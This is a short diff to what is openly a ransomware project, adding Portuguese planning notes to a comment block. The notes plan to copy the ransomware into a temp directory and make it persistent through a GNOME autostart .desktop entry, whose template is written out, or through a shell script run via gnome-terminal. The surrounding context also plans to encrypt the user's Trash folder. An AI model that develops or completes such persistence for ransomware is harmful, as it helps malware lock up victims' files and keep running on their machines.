@@ -78,6 +78,25 @@ NOVAS COISAS :
 
     criptografar lixeira tbm
     os.path.expanduser('~') + '/.local/share/Trash'
+
+
+    persistencia:
+        https://askubuntu.com/questions/48321/how-do-i-start-applications-automatically-on-login
+    copiar ransomware para -> TEMPDIR
+    file -> ransomware.desktop
+
+    UBUNTU
+    [Desktop Entry]
+    Type=Application
+    Name=<Name of application as displayed>
+    Exec=<command to execute>
+    Icon=<full path to icon>
+    Comment=<optinal comments>
+    X-GNOME-Autostart-enabled=true
+
+    GNOME gnome-session-properties
+
+    criar um sh -> gnome-terminal  -e  "/batch-path/batch-name.sh"
 '''
 
 # Starting point of encrypting
